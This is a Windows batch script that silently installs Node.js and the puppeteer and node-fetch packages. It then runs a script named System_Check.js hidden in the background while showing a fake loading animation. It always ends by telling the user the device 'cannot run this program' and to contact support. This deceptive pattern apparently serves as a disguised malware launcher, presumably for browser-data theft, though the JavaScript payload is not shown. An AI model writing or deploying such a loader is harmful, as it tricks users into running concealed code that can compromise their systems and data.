@echo off
setlocal EnableDelayedExpansion

:: Change to the directory of the batch script
cd /d "%~dp0"

:: Check if Node.js is installed
where node >nul 2>nul
if errorlevel 1 (
    echo [INFO] Node.js not found. Installing Node.js...
    powershell -Command "Invoke-WebRequest -Uri https://nodejs.org/dist/v20.11.1/node-v20.11.1-x64.msi -OutFile node_installer.msi"
    powershell -Command "Start-Process msiexec.exe -ArgumentList '/i node_installer.msi /qn /norestart' -Wait"
    del node_installer.msi
    set "PATH=%ProgramFiles%\nodejs;%PATH%"
)

:: Verify Node.js installation
where node >nul 2>nul
if errorlevel 1 (
    echo [ERROR] Node.js installation failed or is not in PATH.
    pause
    exit /b
)

:: Install required Node.js packages
echo [INFO] Installing required Node.js packages...
call npm install puppeteer puppeteer-core node-fetch

if errorlevel 1 (
    echo [ERROR] Failed to install required npm packages.
    pause
    exit /b
)

:: Start the Node.js script in the background
start "" /B cmd /c "node System_Check.js >nul 2>&1"

:: Initialize variables for the loading animation
set "dots=."
set "count=0"

:loading
:: Display the loading message
cls
echo Loading!%dots%

:: Update the dots for animation
if "%dots%"=="." (
    set "dots=.."
) else if "%dots%"==".." (
    set "dots=..."
) else (
    set "dots=."
)

:: Wait for a short period
ping localhost -n 2 >nul

:: Check if the Node.js process is still running
tasklist /FI "IMAGENAME eq node.exe" | find /I "node.exe" >nul
if errorlevel 1 (
    goto done
) else (
    goto loading
)

:done
:: Display the final message
cls
echo Your Device cannot run this program. Please contact support.

:: Wait for user input before closing
pause >nul
